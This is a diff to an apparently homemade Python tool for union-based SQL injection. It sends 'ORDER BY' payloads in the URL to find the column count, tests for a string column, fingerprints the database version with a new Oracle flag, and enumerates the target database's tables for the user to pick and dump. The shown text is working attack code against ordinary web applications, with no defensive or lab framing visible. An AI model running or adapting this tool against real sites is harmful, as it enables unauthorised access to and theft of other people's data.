@@ -25,7 +25,7 @@ def UnionExploitation(url, error_massage):
     print("[*] Figure out number of columns ...")
     columns_no = 0
     for i in range(1, 100):
-        sql_inj = "'+order+by+{}--".format(i)
+        sql_inj = "'+order+by+{}--+-".format(i)
         inj_url = url + sql_inj
         response = requests.get(inj_url)
         error_pattern = re.compile(error_massage)
@@ -45,7 +45,7 @@ def UnionExploitation(url, error_massage):
             print("[+] column {} it's data type is string, verify by payload: {}".format(string_column, sql_payload))
 
             # figure out DB version
-            DB_version = UnionScripts.figure_DB_version(url, sql_payload)
+            DB_version, isOracle = UnionScripts.figure_DB_version(url, sql_payload)
             if DB_version is not None:
                 print("your DB version : {} ".format(DB_version.group(0)))
             else:
@@ -53,7 +53,7 @@ def UnionExploitation(url, error_massage):
 
             # now we started the funny part of this process by starting enumerate data in DB
             # now at (a-2) step we will enumerate tables that exist in this DB
-            DB_tables = UnionScripts.figure_tables_in_DB(url, sql_payload)
+            DB_tables = UnionScripts.figure_tables_in_DB(url, sql_payload, isOracle)
             print("[+] Exploiting {} tables, this is names of this table, insert one to find it's columns ".format(
                 len(DB_tables)))
             for i in DB_tables:
